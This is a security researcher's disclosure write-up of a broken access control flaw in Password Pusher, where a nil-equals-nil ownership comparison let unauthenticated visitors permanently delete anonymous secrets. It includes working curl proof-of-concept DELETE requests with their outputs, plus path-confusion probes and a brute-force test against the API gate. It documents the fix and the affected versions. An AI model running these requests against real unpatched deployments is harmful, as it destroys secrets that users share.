---
title: "Who owns this secret? Nobody. Great, that's me: deleting secrets in Password Pusher"
date: 2026-08-02
draft: false
featured: false
notoc: true
summary: "An unauthenticated visitor holding only a Password Pusher link could permanently destroy the secret behind it, even with deletable_by_viewer turned off, because the ownership check compared two nils and Ruby said they matched."
cve: ""
tags: [ruby-on-rails, broken-access-control, secret-sharing, nil-comparison, password-pusher]
poc_url: ""
poc_sha256: ""
poc_notes: ""
---

Password Pusher is a small Rails app with a simple promise. You paste a secret, it gives you a link, and the link stops working after some number of views or days. Add a passphrase and the link alone is not enough to read it. Plenty of companies self-host it, and it also runs as a public service at pwpush.com.

I spent some time reading version 2.9.4 looking for something worth reporting. What I found was that anyone holding a secret link could permanently destroy the secret, without an account and without the passphrase, even when the creator had turned off the setting that is supposed to prevent exactly that. It came down to one comparison between two things that were both `nil`.

This is how it went, including the two ideas that went nowhere first.

## Picking a direction

Before reading code I wrote down what the app is actually protecting. That list ended up short:

- the secret itself, and the note attached to it
- the passphrase
- the audit log, which records viewer IP, user agent and referer
- the survival of the push until the intended person reads it

That last one is easy to skip past. Password Pusher has a per-push setting called `deletable_by_viewer`. When the creator turns it off, a viewer is not supposed to be able to burn the secret early. So availability is not a side concern here, it is an advertised feature.

The other thing worth writing down is that anonymous use is the default. `allow_anonymous` is true out of the box, and an anonymous push has `user_id` set to NULL in the database. Hold that thought.

## Two dead ends

The first was the API authentication gate. `Api::BaseController#require_api_authentication` decides whether an unauthenticated request is allowed through by testing `request.path.start_with?("/p")` and similar prefixes for files and URLs. A raw string prefix test and the Rails router are two different parsers, and when two parsers disagree about the same input you often get to walk between them. If a path could reach the v1 controller without literally beginning with `/p`, the gate would fall open, and the prize was real: v1's `audit` action has no `authenticate_user!` at all, so it would have leaked viewer IPs for any anonymous push.

I built a small differential harness for it: thirteen path prefixes (`//p`, `/./p`, `/%2e/p`, `/p/../p` and friends) crossed with three authenticated actions, plus format mutations and the usual `X-Original-URL` style header tricks, all sent with `curl --path-as-is` so my own client would not normalise the interesting part away. Thirty nine out of thirty nine were blocked. The reason is boring and good: the `if/elsif` chain ends in a bare `else head :unauthorized`, so anything unrecognised is rejected rather than allowed. Confusing the prefix makes the gate stricter.

The second was passphrase brute force. Rails 8's `rate_limit` needs a cache store that implements `increment`, and production here uses `:file_store`. If that quietly no-opped, the throttle would be decorative. Twelve rapid wrong guesses gave me `401 401 401 401 401 429 429 429 429 429 429 429`. It fires at exactly the configured five per minute. Moving on.

## The comparison that did not look right

With the fun theories dead I went back to something duller: reading the ownership checks in the codebase and asking what each one does when a value is missing.

Two of them stood out because they are reachable without logging in.

```ruby
# app/controllers/api/v1/pushes_controller.rb:310
def destroy
  if (@push.user == current_user) || @push.deletable_by_viewer
```

```ruby
# app/controllers/pushes_controller.rb:333
def expire
  unless @push.deletable_by_viewer || (@push.user == current_user)
```

Read that as a sentence and it says "if you own this push, or if viewers are allowed to delete it." Read it as Ruby and it says something else.

`Push` declares `belongs_to :user, optional: true`, so an anonymous push has `user` equal to `nil`. An unauthenticated request has `current_user` equal to `nil`. And Ruby, being reasonable in isolation and unhelpful here, evaluates `nil == nil` as true.

<img src="/images/same-picture.gif" width="400" alt="The 'they're the same picture' meme, comparing an anonymous push's owner with an unauthenticated visitor" style="display:block; margin-bottom:1.5em">

So for every anonymous push, the ownership half of that condition is true for every anonymous visitor. The expression short circuits and `deletable_by_viewer` is never read. The check is not asking "are you the owner." It is asking "are you and the owner both absent," and answering yes.

Neither action looks at the passphrase either. The passphrase protects reading, not destruction.

## Ruling out intended behaviour

The obvious objection, and the one I would have raised as a maintainer, is that an anonymous push has no owner, so treating any viewer as the owner might be deliberate. That reading dies if you send the same request twice against the same push, once with credentials and once without.

Anonymous push, `deletable_by_viewer=false`, on 2.9.4:

```
$ curl -s -X DELETE -H 'Authorization: Bearer <api-token>' http://localhost:5100/p/hy5rnof8t3psphcmlw.json
{"error":"That push is not deletable by viewers."}
HTTP 401

$ curl -s http://localhost:5100/p/hy5rnof8t3psphcmlw.json
{"payload": "ASYMMETRY-TEST", "expired": false}

$ curl -s -X DELETE http://localhost:5100/p/hy5rnof8t3psphcmlw.json
{"expired": true, "deleted": true}
HTTP 200
```

That first 401 is not a rejected token. The token is valid, and the app is answering "that push is not deletable by viewers," which is the correct decision. It just never gets made for the request that has no token at all.

So an authenticated administrator is refused, and a complete stranger with no credentials succeeds. Logging in sets `current_user`, which makes the comparison false, which correctly routes the request to the `deletable_by_viewer` check that the anonymous request never reaches. Authenticating reduced my privileges, which is a good sign you are looking at an accident rather than a policy.

## The part that made it worse

URL pushes have a stated rule in the code that they can never be deleted by a viewer:

```ruby
# app/controllers/concerns/set_push_attributes.rb:6
def assign_deletable_by_viewer(push, push_params)
  if push.url?
    # URLs cannot be preemptively deleted by end users ever
    push.deletable_by_viewer = nil
```

The comment says never. The enforcement is `nil`, which is falsy, which means the only thing standing between a viewer and deletion was the  broken ownership comparison.

## Where it came from

The current expression is not how this was originally written. Version 1.45.10 handled the anonymous case explicitly:

```ruby
# app/controllers/passwords_controller.rb (v1.45.10), lines 274-289
if user_signed_in?
  if @push.user_id == current_user.id
    is_owner = true
  else
    redirect_to :root, notice: _("That push does not belong to you.")
    return
  end
elsif @push.deletable_by_viewer == false
  redirect_to :root, notice: _("That push is not deletable by viewers.")
  return
end
```

Commit `b9eb986d` (PR #2585, October 2024) was titled "Fix: Deleting Push with Last View yields Error 500." It replaced that branch with the single comparison, and the authorization behaviour changed as a side effect of fixing a crash. Running the shipped 1.45.10 and 1.45.11 images side by side confirms the boundary: on 1.45.10 the anonymous delete is refused and the push survives, on 1.45.11 it succeeds.

Nothing about this is exotic. A 500 got fixed, the new code looked equivalent, and a test for "anonymous push plus `deletable_by_viewer=false` plus unauthenticated DELETE" did not exist to catch this.

## The full run on 2.9.4

Official image `pglombardo/pwpush:2.9.4`, default config, nothing modified inside the container.

Create a push that the creator marked as not deletable, with a passphrase on it:

```
$ curl -s -X POST http://localhost:5100/p.json -H 'Content-Type: application/json' \
    -d '{"password":{"payload":"SUPER-SECRET","passphrase":"s3cr3t","deletable_by_viewer":"false"}}'
{
  "url_token": "slkovrmmboov",
  "deletable_by_viewer": false,
  "expired": false
}
```

As the attacker, holding only the link, confirm you cannot read it:

```
$ curl -s -o /dev/null -w '%{http_code}\n' http://localhost:5100/p/slkovrmmboov.json
401
```

Delete it anyway. No account, no API token, no passphrase:

```
$ curl -s -X DELETE http://localhost:5100/p/slkovrmmboov.json
{
  "expired": true,
  "deleted": true,
  "deletable_by_viewer": false
}
HTTP 200
```

Now the person who was supposed to receive it, who does have the passphrase:

```
$ curl -s 'http://localhost:5100/p/slkovrmmboov.json?passphrase=s3cr3t'
{
  "payload": null,
  "expired": true,
  "days_remaining": 7
}
```

The HTML route behaves the same way on a second push:

```
$ curl -s -o /dev/null -w '%{http_code}\n' -X DELETE http://localhost:5100/p/lflf-sa3-azujyt7mx4/expire
302
$ curl -s http://localhost:5100/p/lflf-sa3-azujyt7mx4.json
{"payload": null, "expired": true}
```

`Push#expire!` nulls the payload, nulls the passphrase and purges any attached files, then saves. There is no undo.

The practical impact is that anyone who touches the link in transit can destroy the secret before it is read. Mail gateways, chat platforms, logging proxies, URL rewriting scanners, or simply a recipient who was meant to read the secret but not to revoke it. That last group is exactly the population `deletable_by_viewer=false` exists to constrain. There is a second effect on the audit trail: the push is marked expired rather than retrieved, so the creator cannot tell a third party destruction apart from a normal expiry.

I scored it CVSS 4.0 6.9 Medium (`AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:L/SC:N/SI:N/SA:N`) under CWE-863. No confidentiality impact, one push destroyed per attack, and having the link counted as ordinary usage rather than as an extra hurdle for the attacker, since once you have it the attack works every time.

## The fix

I reported it privately through GitHub Security Advisories. The maintainer had it merged and released quickly, which is not something that can be taken for granted.

The fix in PR #4703 moves the decision into the model and makes the missing user case explicit:

```ruby
# app/models/push.rb:199
def deletable_by?(user)
  (user.present? && user_id == user.id) || deletable_by_viewer == true
end
```

Both call sites now use it, and the `deletable_by_viewer == true` comparison closes the URL push hole at the same time, since `nil` is no longer good enough. The PR also adds regression tests for the exact combination that was missing.

A follow-up, PR #4704, adds `Push#owned_by?` and applies it to the remaining `@push.user == current_user` comparisons in the audit, edit, update and notify paths. Those endpoints were already behind authentication, so this is defence in depth rather than a second bug, but it means the pattern is gone from the codebase rather than fixed in two places.

Same PoC, same commands, against `pglombardo/pwpush:2.9.6`:

```
$ curl -s -X DELETE http://localhost:5101/p/o7sbmkit5b4tlgi.json
{}
HTTP 401

$ curl -s 'http://localhost:5101/p/o7sbmkit5b4tlgi.json?passphrase=s3cr3t'
{
  "payload": "SUPER-SECRET",
  "expired": false,
  "days_remaining": 7
}
```

The HTML route still answers 302, because it redirects with a notice rather than returning a status code, so check the push rather than the status:

```
$ curl -s -o /dev/null -w '%{http_code}\n' -X DELETE http://localhost:5101/p/tqo_rx1wor3gw-dq4hq/expire
302
$ curl -s http://localhost:5101/p/tqo_rx1wor3gw-dq4hq.json
{"payload": "HTML-ROUTE-SECRET", "expired": false}
```

## Versions and timeline

Affected: v1.45.11 through v2.9.5, in deployments that allow anonymous pushes, which is the default. Pushes created by a signed-in user were never affected, because `user` is non-nil and the comparison does what it looks like it does.

Fixed in v2.9.6. The ownership hardening landed in v2.9.7. If you self-host, upgrade to at least 2.9.6.

One thing to watch when you check your own deployment: 2.9.5 went out about four hours before the fix merged, and it is still vulnerable. I ran the same PoC against the shipped 2.9.5 image to be sure. Being on the previous release is not the same as being patched.

- Late July 2026: reported privately through GitHub Security Advisories
- 1 August 2026, 23:13 UTC: PR #4703 merged
- 1 August 2026, 23:20 UTC: v2.9.6 released
- 2 August 2026, 00:02 UTC: PR #4704 merged
- 2 August 2026, 00:14 UTC: v2.9.7 released

A CVE has been requested and the advisory is pending publication.

References:

- [PR #4703](https://github.com/pglombardo/PasswordPusher/pull/4703), the fix
- [PR #4704](https://github.com/pglombardo/PasswordPusher/pull/4704), the ownership hardening
- [v2.9.6 release](https://github.com/pglombardo/PasswordPusher/releases/tag/v2.9.6)

## What I took from it

The whole bug is one comparison, and it sat in released code for nearly two years because it reads correctly in English. `@push.user == current_user` is what you would write on a whiteboard if someone asked you to describe an ownership check.

The habit that found it was not clever. I went through every authorization check in the app and asked what each one does when one side is missing. That question has a different answer almost everywhere you go. In Ruby, `nil == nil` is true. In SQL, `NULL = NULL` is not. In JavaScript, `null == undefined` is true while `null === undefined` is false. So the useful question at an authorization check is rarely "does this compare the right things." It is "what does this do when there is nothing to compare."
